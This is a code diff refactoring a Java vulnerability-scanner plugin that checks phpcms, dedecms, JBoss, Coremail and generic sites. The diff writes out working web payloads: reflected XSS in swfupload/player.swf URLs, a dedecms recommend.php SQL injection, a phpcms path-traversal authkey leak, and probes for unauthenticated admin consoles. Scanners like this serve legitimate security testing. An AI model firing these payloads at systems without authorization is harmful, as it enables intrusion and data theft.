@@ -8,6 +8,7 @@ import com.trackray.base.plugin.InnerPlugin;
 import com.trackray.base.utils.SysLog;
 import lombok.Builder;
 import lombok.Data;
+import org.apache.commons.collections.map.MultiValueMap;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.http.Header;
 import org.javaweb.core.net.HttpRequest;
@@ -16,9 +17,7 @@ import org.javaweb.core.net.HttpURLRequest;
 import us.codecraft.webmagic.utils.HttpConstant;
 
 import java.net.MalformedURLException;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 
 @Rule(enable = false)
 @Plugin(value = "simpleVulRule" ,title = "简单CMS漏洞检测规则" , author = "浅蓝")
@@ -26,14 +25,34 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
     private String target;
     private List<Vulnerable> vulns = new ArrayList<>();
 
-    private List<Payloader> doSwitch(FingerPrint finger) {
-        List<Payloader> loaders = new ArrayList<>();
-        switch (finger) {
-            case $phpcms:
+    public MultiValueMap assemble(){
+        MultiValueMap multiPayloader = new MultiValueMap();
 
-                loaders.add(
-                        Payloader.builder()
-                        .url("/statics/js/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(1)}}//")
+        multiPayloader.put(FingerPrint.$phpcms , Payloader.builder()
+                .url("/statics/js/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(1)}}//")
+                .custom(new Custom() {
+                    @Override
+                    public boolean fun(HttpResponse response) throws Exception {
+                        if (    response!=null &&
+                                response.getStatusCode() == 200 &&
+                                response.getContentType().contains("flash")){
+                            return true;
+                        }
+                        return false;
+                    }
+                })
+                .vuln(
+                        Vulnerable.builder()
+                                .type(Vulnerable.Type.XSS.getType())
+                                .level(Vulnerable.Level.HIGH.getLevel())
+                                .title("phpcms v9 swfupload.swf flash xss").build()
+                )
+                .build());
+
+
+        multiPayloader.put(FingerPrint.$phpcms,
+                Payloader.builder()
+                        .url("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\\\"))}catch(e){alert(1)}%2f%2f")
                         .custom(new Custom() {
                             @Override
                             public boolean fun(HttpResponse response) throws Exception {
@@ -47,128 +66,95 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         })
                         .vuln(
                                 Vulnerable.builder()
-                                .type(Vulnerable.Type.XSS.getType())
-                                .level(Vulnerable.Level.HIGH.getLevel())
-                                .title("phpcms v9 swfupload.swf flash xss").build()
+                                        .type(Vulnerable.Type.XSS.getType())
+                                        .level(Vulnerable.Level.HIGH.getLevel())
+                                        .title("phpcms v9 player.swf flash xss").build()
                         )
                         .build()
-                );
+        );
 
-                loaders.add(
-                        Payloader.builder()
-                                .url("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\\\"))}catch(e){alert(1)}%2f%2f")
-                                .custom(new Custom() {
-                                    @Override
-                                    public boolean fun(HttpResponse response) throws Exception {
-                                        if (    response!=null &&
-                                                response.getStatusCode() == 200 &&
-                                                response.getContentType().contains("flash")){
-                                            return true;
-                                        }
-                                        return false;
-                                    }
-                                })
-                                .vuln(
-                                        Vulnerable.builder()
-                                                .type(Vulnerable.Type.XSS.getType())
-                                                .level(Vulnerable.Level.HIGH.getLevel())
-                                                .title("phpcms v9 player.swf flash xss").build()
-                                )
-                                .build()
-                );
-
-                loaders.add(
-                        Payloader.builder()
-                                .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
-                                .method(HttpRequest.Method.GET)
-                                .containsStr("aaaaa")
-                                .vuln(
-                                        Vulnerable.builder()
-                                                .level(Vulnerable.Level.HIGH.getLevel())
-                                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
-                                                .title("phpcms authkey泄漏")
-                                                .build()) //另一种实现方式
-                                .build()
-                );
-
-                break;
-            case $Discuz:
-                break;
-            case $dedecms:
-
-                loaders.add(
-                        Payloader.builder()
-                                .url("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\' or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,md5(1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873")
-                                .containsStr("c4ca4238a0b923820dcc509a6f75849b")
-                                .vuln(Vulnerable.builder()
-                                        .title("dedecms /plus/recommend.php SQL注入漏洞")
+        multiPayloader.put(FingerPrint.$phpcms,
+                Payloader.builder()
+                        .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
+                        .method(HttpRequest.Method.GET)
+                        .containsStr("aaaaa")
+                        .vuln(
+                                Vulnerable.builder()
                                         .level(Vulnerable.Level.HIGH.getLevel())
-                                        .type(Vulnerable.Type.SQL_INJECTION.getType())
-                                        .build())
-                                .build()
-                );
-                ///images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert("xss")}}//
-                loaders.add(
-                        Payloader.builder()
-                                .url("/data/mysql_error_trace.inc")
-                                .containsStr("<?php")
-                                .vuln(
-                                        Vulnerable.builder()
-                                                .title("dedecms /data/mysql_error_trace.inc 信息泄露")
-                                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
-                                                .level(Vulnerable.Level.HIGH.getLevel())
-                                                .build()
-                                )
-                                .build()
-                );
-                loaders.add(
-                        Payloader.builder()
-                                .url("/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"xss\")}}//")
-                                .custom(new Custom() {
-                                    @Override
-                                    public boolean fun(HttpResponse response) throws Exception {
-                                        if (    response!=null &&
-                                                response.getStatusCode() == 200 &&
-                                                response.getContentType().contains("flash")){
-                                            return true;
-                                        }
-                                        return false;
-                                    }
-                                })
-                                .vuln(Vulnerable.builder().title("dedecms 5.7 /swfupload.swf 反射xss")
+                                        .type(Vulnerable.Type.INFO_LEAKAGE.getType())
+                                        .title("phpcms authkey泄漏")
+                                        .build()) //另一种实现方式
+                        .build()
+        );
+
+
+        multiPayloader.put(FingerPrint.$dedecms,
+                Payloader.builder()
+                        .url("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\' or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,md5(1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873")
+                        .containsStr("c4ca4238a0b923820dcc509a6f75849b")
+                        .vuln(Vulnerable.builder()
+                                .title("dedecms /plus/recommend.php SQL注入漏洞")
+                                .level(Vulnerable.Level.HIGH.getLevel())
+                                .type(Vulnerable.Type.SQL_INJECTION.getType())
+                                .build())
+                        .build()
+        );
+        ///images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert("xss")}}//
+        multiPayloader.put(FingerPrint.$dedecms,
+                Payloader.builder()
+                        .url("/data/mysql_error_trace.inc")
+                        .containsStr("<?php")
+                        .vuln(
+                                Vulnerable.builder()
+                                        .title("dedecms /data/mysql_error_trace.inc 信息泄露")
+                                        .type(Vulnerable.Type.INFO_LEAKAGE.getType())
+                                        .level(Vulnerable.Level.HIGH.getLevel())
+                                        .build()
+                        )
+                        .build()
+        );
+        multiPayloader.put(FingerPrint.$dedecms,
+                Payloader.builder()
+                        .url("/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"xss\")}}//")
+                        .custom(new Custom() {
+                            @Override
+                            public boolean fun(HttpResponse response) throws Exception {
+                                if (    response!=null &&
+                                        response.getStatusCode() == 200 &&
+                                        response.getContentType().contains("flash")){
+                                    return true;
+                                }
+                                return false;
+                            }
+                        })
+                        .vuln(Vulnerable.builder().title("dedecms 5.7 /swfupload.swf 反射xss")
                                 .level(Vulnerable.Level.HIGH.getLevel()).type(Vulnerable.Type.XSS.getType()).build())
-                                .build()
-                );
+                        .build()
+        );
 
 
-                loaders.add(
-                        Payloader.builder()
-                                .url("/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D")
-                                .request(new HttpURLRequest().followRedirects(false).method(HttpRequest.Method.GET))
-                                .custom(new Custom() {
-                                    @Override
-                                    public boolean fun(HttpResponse response) throws Exception {
-                                        if (    response!=null &&
-                                                response.getStatusCode() == 302 ){
-                                            return true;
-                                        }
-                                        return false;
-                                    }
-                                })
-                                .vuln(Vulnerable.builder().title("dedecms 5.7  /plus/download.php URL重定向漏洞")
-                                        .level(Vulnerable.Level.MIDDLE.getLevel()).type(Vulnerable.Type.UNKNOWN.getType()).build())
-                                .build()
-                );
+        multiPayloader.put(FingerPrint.$dedecms,
+                Payloader.builder()
+                        .url("/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D")
+                        .request(new HttpURLRequest().followRedirects(false).method(HttpRequest.Method.GET))
+                        .custom(new Custom() {
+                            @Override
+                            public boolean fun(HttpResponse response) throws Exception {
+                                if (    response!=null &&
+                                        response.getStatusCode() == 302 ){
+                                    return true;
+                                }
+                                return false;
+                            }
+                        })
+                        .vuln(Vulnerable.builder().title("dedecms 5.7  /plus/download.php URL重定向漏洞")
+                                .level(Vulnerable.Level.MIDDLE.getLevel()).type(Vulnerable.Type.UNKNOWN.getType()).build())
+                        .build()
+        );
 
-                break;
-            default:
-                /**
-                 * 以上都没有匹配时执行
-                 */
-                break;
-        }
+
         /****  通用规则 *****/
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder()
                         .url("/crossdomain.xml")
                         .containsStr("domain=\"*\"")
@@ -181,7 +167,8 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         ).build()
         );
 
-        loaders.add(Payloader.builder()
+        multiPayloader.put(FingerPrint.unknown,
+                Payloader.builder()
                 .url("/mailsms/s?func=ADMIN:appState&dumpConfig=/")
                 .containsStr("/home/coremail")
                 .vuln(Vulnerable.builder()
@@ -191,7 +178,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         .build())
                 .build());
 
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder().url("/WebResource.axd?d=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1")
                         .containsStr("Microsoft .NET Framework")
                         .vuln(Vulnerable.builder()
@@ -202,7 +189,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
         );
 
         /*************************JBOSS*************************/
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder().url("/examples/servlets/index.html")
                         .containsStr("Servlet Examples")
                         .vuln(Vulnerable.builder()
@@ -215,7 +202,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
 
 
         /*************************JBOSS*************************/
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder().url("/jmx-console/")
                         .containsStr("JMX Agent")
                         .vuln(Vulnerable.builder()
@@ -223,7 +210,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                                 .type(Vulnerable.Type.UNAUTHORIZED_ACCESS.getType())
                                 .title("JBOSS /jmx-console/ 未授权访问").build()).build()
         );
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder().url("/web-console/ServerInfo.jsp")
                         .containsStr("JBoss Management")
                         .vuln(Vulnerable.builder()
@@ -231,7 +218,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                                 .type(Vulnerable.Type.UNAUTHORIZED_ACCESS.getType())
                                 .title("JBOSS /web-console/ 未授权访问").build()).build()
         );
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder().url("/invoker/readonly/")
                         .containsStr("ObjectInputStream")
                         .vuln(Vulnerable.builder()
@@ -243,7 +230,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
         /*******************************************************/
 
 
-        loaders.add(
+        multiPayloader.put(FingerPrint.unknown,
                 Payloader.builder()
                         .url("/robots.txt")
                         .method(HttpRequest.Method.GET)
@@ -270,6 +257,15 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         .build()
         );
 
+
+        return multiPayloader;
+    }
+
+    private List<Payloader> doSwitch(FingerPrint finger) {
+        List<Payloader> loaders = new ArrayList<>();
+
+        Collection payloads = assemble().getCollection(finger);
+        loaders.addAll(payloads);
 
         return loaders;
     }
